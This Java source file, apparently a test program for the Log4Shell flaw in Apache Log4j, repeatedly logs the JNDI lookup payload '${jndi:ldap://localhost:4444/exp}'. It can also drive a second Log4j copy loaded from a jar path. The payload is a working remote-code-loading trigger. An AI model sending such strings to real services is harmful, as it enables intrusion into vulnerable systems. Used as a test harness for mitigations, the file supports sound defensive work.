/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 * 
 *   http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */

import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Vuln {
  private static final Logger logger = LogManager.getLogger(Vuln.class);

  public static void main(String[] args) throws Exception {
    String attackString = "${jndi:ldap://localhost:4444/exp}";

    if (args.length > 0) {
      new Thread(new Runnable() {
	  public void run() {
	    try {
	      Thread.sleep(20_000);
	      System.out.println("--> Starting second logger");
	      File jarFile = new File(args[0]);
	      URLClassLoader loader = new URLClassLoader(new URL[]{jarFile.toURI().toURL()}, null);
	      Class<?> logManagerClass = loader.loadClass("org.apache.logging.log4j.LogManager");
	      Method getLogger = logManagerClass.getDeclaredMethod("getLogger", new Class[] { Class.class });
	      Class<?> loggerClass = loader.loadClass("org.apache.logging.log4j.Logger");
	      Method error = loggerClass.getDeclaredMethod("error", new Class[] { String.class });
	      Object logger = getLogger.invoke(null, new Object[] { Vuln.class });
	      while (true) {
		error.invoke(logger, new Object[] { attackString });
		Thread.sleep(1_000);
	      }
	    } catch (Exception e) {
	      System.out.println(e);
	    }
	  }
	}).start();
    }

    while (true) {
      logger.error(attackString);
      Thread.sleep(1_000);
    }
  }
}
